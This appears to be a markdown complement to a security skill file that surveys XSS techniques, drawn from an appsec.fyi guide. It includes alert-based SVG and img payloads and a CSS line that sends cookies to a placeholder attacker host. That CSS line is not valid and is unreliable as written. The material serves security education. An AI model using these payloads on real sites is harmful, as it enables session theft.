<!-- appsec-fyi delta — source-cited techniques from https://appsec.fyi/guide/xss.html -->
<!-- Additive complement. Does NOT override this skill's own methodology/matrix. Owner skill rules win. -->

## Notable Techniques and Attack Vectors

Notable Techniques and Attack Vectors
The landscape of XSS exploitation is vast and continuously evolving, with attackers employing increasingly sophisticated techniques to bypass filters and achieve their objectives.

SVG and XML Exploitation
Scalable Vector Graphics (SVG) files, while powerful for graphics, can also serve as vectors for XSS. SVGs are XML-based and can embed scripts. Attackers can upload crafted SVG files that contain JavaScript, leveraging event handlers like onload or even CSS within the SVG to execute code. 

Techniques include manipulating SVG sanitizers using custom namespaces, embedding malicious scripts via data: URLs, and exploiting animation tags like animate and animateTransform. [S]

Furthermore, SVG can be exploited via XSLT stylesheets and Link headers, or by importing GIFs disguised as SVGs. [S]

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>

Office Open XML (OOXML) files, commonly used in Microsoft Office applications, can be exploited through XML External Entity (XXE) vulnerabilities, which can sometimes lead to XSS when the processed XML is rendered in a browser context. 

DOM Clobbering and Parser Manipulations
DOM Clobbering is a technique where an attacker manipulates the Document Object Model (DOM) to override legitimate JavaScript variables or functions, often leading to bypasses of sanitization routines or the execution of unintended code. This technique exploits how browsers handle DOM elements that share names with global JavaScript objects or variables. 

Exploiting inconsistencies in HTML parsing, especially in how different browsers or sanitizers interpret malformed HTML, is a powerful way to bypass XSS filters. This can involve manipulating tag names, attribute values, or leveraging browser-specific parsing quirks. 

<img src=xss onerror=alert(1)> can be a basic example, but complex DOM clobbering involves carefully crafted HTML structures that interact with existing JavaScript. For instance, naming an input element the same as a sensitive variable can allow an attacker to overwrite it. 

WAF and Filter Bypass Techniques
Web Application Firewalls (WAFs) and input filters are common defenses against XSS, but they are often imperfect. Attackers employ numerous techniques to bypass them:

• Character Encoding and Obfuscation: Using various encoding schemes (Unicode, Hex, Base64), case variations, or NULL bytes to disguise malicious payloads. 

• Keyword Fragmentation and Reassembly: Breaking down keywords like javascript or alert into smaller pieces that are reassembled by the browser or JavaScript runtime. [S]

• Parameter Pollution: Exploiting how web servers or WAFs handle multiple parameters with the same name, or confusing parsing logic. 

• Context Breaking: Manipulating the parsing context (e.g., breaking out of HTML attributes, JavaScript strings, or CSS values) to introduce malicious code. 

• Obscure Event Handlers and Tags: Utilizing less common HTML tags or event handlers that might not be as rigorously filtered. 

• HTTP Smuggling: Exploiting discrepancies in how different servers (e.g., front-end proxies and back-end servers) interpret HTTP requests, potentially leading to injected content being processed unexpectedly. 

• Mutation XSS (mXSS): This occurs when sanitizers are bypassed not by direct injection, but by a transformation of the input during parsing or rendering that results in executable code. This can exploit differences in HTML interpretation between the sanitizer and the browser. 

DOM-Based XSS in Modern Frameworks
Modern JavaScript frameworks like React, Vue, and Angular, while offering powerful features, can introduce new XSS attack surfaces if not used correctly. Developers must be mindful of how data flows through these frameworks and ensure that user-controlled input is properly handled before being rendered or passed to DOM manipulation functions. 

AngularJS Template Injection: A critical vulnerability in AngularJS allows attackers to inject Angular expressions into templates, leading to XSS. If user input is not properly sanitized before being rendered as part of an Angular template, an attacker can execute arbitrary JavaScript. 

<div ng-app><div ng-controller="Ctrl">{{ userComment }}</div></div> where userComment is unsanitized.

innerHTML and document.write() Sinks: These are common DOM XSS sinks that directly interpret HTML strings. Using them with unsanitized user input is a direct path to XSS. 

window.name Abuse: The window.name property can store a string, which can be manipulated by JavaScript across different origins. This can be abused in conjunction with other vulnerabilities to bypass security controls. 

POST-Based XSS and Account Takeover
While XSS is often associated with GET requests (via URL parameters), POST requests can also be vulnerable. If user-supplied data in a POST request is reflected unsanitized in the response, it can lead to XSS. In scenarios involving account takeover, attackers might combine POST-based XSS with other techniques like CSRF or exploit user behavior to execute malicious code. 

Self-XSS to Reflected XSS: Attackers can sometimes convert Self-XSS (where the user must initiate the malicious action themselves) into a reflected or stored XSS by chaining it with CSRF, UI redressing, or by tricking the user into triggering the exploit. [S]

Exploiting Browser Extensions and WebExtensions
Browser extensions, due to their privileged access to web pages, can be targets or vectors for XSS. Vulnerabilities in content scripts or service workers can lead to arbitrary URL fetches, data leakage (e.g., screenshot data), or privilege escalation. [S]

CSS Weaponization
CSS can be weaponized to achieve XSS, particularly in contexts like webmail clients where full HTML rendering might be restricted but CSS is still processed. Techniques include injecting malicious CSS that exploits vulnerabilities in the email client's rendering engine, exfiltrating tokens, spoofing UI elements, or stealing passwords. 

<style> @import "http://attacker.com/steal?cookie=" + document.cookie;</style>

Other Notable Techniques

• JavaScript Prototype Pollution: This vulnerability allows attackers to modify the __proto__ property of JavaScript objects, potentially leading to denial-of-service, property injection, or even RCE in certain server-side JavaScript environments. [S]

• Error.prepareStackTrace Abuse: Invoking JavaScript functions without parentheses by manipulating Error.prepareStackTrace can bypass certain filter mechanisms. [S]

• Build Log XSS: XSS can occur in build logs if they improperly render special characters or hyperlinks, such as OSC 8 hyperlinks generated by tools like ansi2html. [S]

• Credentialless Iframes: These can be used to elevate Self-XSS to Stored XSS by bypassing Same-Origin Policy restrictions under certain conditions. [S]

• Log Injection: In Node.js applications, improper handling of log messages can lead to injection vulnerabilities, where attackers can inject malicious scripts or data into logs, which may later be rendered by an administrative interface. [S]

• SVG Sanitizer Bypasses: Cloudflare's image endpoint was found to be vulnerable to XSS via SVG sanitizer bypasses, illustrating that even sophisticated infrastructure can have such flaws. 

• Zero-Interaction XSS: Some vulnerabilities allow for code execution without any direct interaction from the victim, such as reflected XSS in login redirect flows. 